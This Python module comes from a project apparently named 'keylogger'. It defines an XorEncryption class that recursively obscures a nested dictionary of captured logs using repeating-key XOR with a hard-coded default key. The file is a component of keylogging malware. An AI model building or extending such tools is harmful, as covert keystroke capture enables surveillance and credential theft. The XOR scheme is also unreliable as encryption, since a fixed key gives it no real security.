from keylogger.interfaces import EncryptorInterface


class XorEncryption(EncryptorInterface):
    """Implements simple XOR encryption."""

    def __init__(self, key="my_secret_key"):
        self.key = key

    def encrypt(self, data: str) -> str:
        return "".join(chr(ord(c) ^ ord(self.key[i % len(self.key)])) for i, c in enumerate(data))

    def decrypt(self, data: str) -> str:
        return self.encrypt(data)  # XOR is reversible with the same operation

    def encrypted_dict_req(self, enc_func, logs_dict, encrypted_dict):
        for key, value in logs_dict.items():
            enc_key = enc_func(key)
            if not isinstance(value, dict):
                encrypted_dict[enc_key] = enc_func(value)
            else:
                encrypted_dict[enc_key] = {}
                self.encrypted_dict_req(enc_func, value, encrypted_dict[enc_key])

    def get_encrypted_dict(self, enc_func, logs_dict):
        encrypted_dict = {}
        self.encrypted_dict_req(enc_func, logs_dict, encrypted_dict)
        return encrypted_dict
